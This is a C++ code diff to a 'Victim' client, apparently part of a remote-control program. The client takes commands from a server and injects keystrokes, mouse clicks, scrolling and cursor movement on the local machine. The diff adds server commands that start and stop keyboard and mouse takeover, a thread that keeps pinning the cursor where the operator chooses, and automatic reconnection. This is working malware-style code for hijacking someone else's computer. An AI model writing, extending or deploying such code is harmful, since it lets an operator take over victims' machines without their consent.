@@ -37,8 +37,18 @@ int Victim::controlVictim()
         //if the packet is invalid reconnect with the server
         if (p.getDataSize() == 0) {
             std::cout << "DISCONNECTED FROM SERVER\n";
-            isConnected = false;
-            releaseAll();
+            isConnected = false, controlMouse = false, controlKeybord = false;
+            for (int i = 0; i < 255; i++) {
+                if (!keysStates[i])
+                    continue;
+                keysStates[i] = false;
+
+                //if its a mouse key, treat it accordingly
+                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
+                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
+                else
+                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+            }
             connectServer();
         }
 
@@ -47,7 +57,17 @@ int Victim::controlVictim()
         
         //exit program
         if (cmd == 'e') {
-            releaseAll();
+            for (int i = 0; i < 255; i++) {
+                if (!keysStates[i])
+                    continue;
+                keysStates[i] = false;
+
+                //if its a mouse key, treat it accordingly
+                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
+                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
+                else
+                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+            }
             isRunning = false;
         }
         //key pressed-released
@@ -59,9 +79,9 @@ int Victim::controlVictim()
             keysStates[vkc] = state;
 
             //if its a mouse key, treat it accordingly
-            if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
+            if ((vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06) && controlMouse)
                 Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), state);
-            else
+            else if (controlKeybord)
                 Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), state);
         }
         //mouse moved
@@ -70,8 +90,8 @@ int Victim::controlVictim()
             p >> a >> b;
             float x = a / (256.f * 256.f) * screenSize.x;
             float y = b / (256.f * 256.f) * screenSize.y;
-            //move the mouse to the given position
-            Mlib::Mouse::setPos(Mlib::Vec2i(x, y));
+            if (controlMouse)
+                mousePos = Mlib::Vec2i(x, y);
         }
         //wheel scrolled
         else if (cmd == 'k') {
@@ -79,9 +99,34 @@ int Victim::controlVictim()
             p >> delta;
             Mlib::Mouse::simulateScroll(delta * 100.f);
         }
-        //release all keys
-        else if (cmd == 'a') {
-            releaseAll();
+        //start/stop controlling keyboard
+        else if (cmd == 'a' || cmd == 'z') {
+            for (int i = 0; i < 255; i++) {
+                if (!keysStates[i] || i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
+                    continue;
+                keysStates[i] = false;
+
+                Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+            }
+
+            if (cmd == 'a')
+                controlKeybord = true;
+            else
+                controlKeybord = false;
+        }
+        //start/stop controlling keyboard
+        else if (cmd == 's' || cmd == 'x') {
+            for (int i = 0; i < 7; i++) {
+                if (!keysStates[i] || !(i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06))
+                    continue;
+                keysStates[i] = false;
+
+                Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
+            }
+            if (cmd == 's')
+                controlMouse = true;
+            else
+                controlMouse = false;
         }
         //rename client
         else if (cmd == 'w') {
@@ -93,9 +138,20 @@ int Victim::controlVictim()
         }
         //apparently victim isnt initialized
         else if (cmd == '?') {
-            isConnected = false;
+            for (int i = 0; i < 255; i++) {
+                if (!keysStates[i])
+                    continue;
+                keysStates[i] = false;
+
+                //if its a mouse key, treat it accordingly
+                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
+                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
+                else
+                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+            }
+
             //connect and initialize again
-            releaseAll();
+            isConnected = false, controlMouse = false, controlKeybord = false;
             connectServer();
         }
     }
@@ -144,19 +200,16 @@ init:
     std::cout << "connection with server approved\n";
 
     isConnected = true;
+
+    std::thread pinMouse(&Victim::pinMouse, this);
+    pinMouse.detach();
 }
 
-void Victim::releaseAll()
+void Victim::pinMouse()
 {
-    for (int i = 0; i < 255; i++) {
-        if (!keysStates[i])
-            continue;
-        keysStates[i] = false;
-
-        //if its a mouse key, treat it accordingly
-        if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
-            Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
-        else
-            Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+    while (true) {
+        if (controlMouse)
+            Mlib::Mouse::setPos(mousePos);
+        Mlib::sleep(1);
     }
 }
